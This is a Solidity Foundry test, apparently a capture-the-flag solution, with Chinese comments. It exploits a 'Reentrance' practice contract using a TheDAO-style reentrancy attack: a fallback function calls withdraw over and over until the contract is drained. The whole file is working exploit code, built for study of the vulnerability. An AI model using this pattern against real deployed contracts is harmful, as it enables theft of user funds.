pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Reentrace.sol";


/** 
 * 解题思路：这里的攻击模式类似 TheDAO 的攻击方式，利用 fallback 合约，持续发起提款，直到合约中再也没有足够的钱
 */
contract HackReentraceTest is Test {
    address hacker = address(hacker);
    Reentrance public r;

    function setUp() public {
        vm.deal(hacker, 1 ether);
        r = new Reentrance();
        vm.deal(address(this), 10 ether);
    }
    function testHackReentrace() public {
        console.log("current balance:");
        console.logUint(address(this).balance);
        
        // 向合约中捐款
        r.donate{value: 1.5 ether}(address(this));
        console.log("after donate, current balance:");
        console.logUint(address(this).balance);

        // 开始发起提款攻击
        r.withdraw(1 ether);
        console.log("after withdraw, current balance:");
        console.logUint(address(this).balance);
    }

    // 如果合约中还有钱，那就继续发起提款
    fallback() external payable {
        uint bal = address(r).balance;
        if (bal >= 1 ether) {
            r.withdraw(1 ether);
        }
    }
}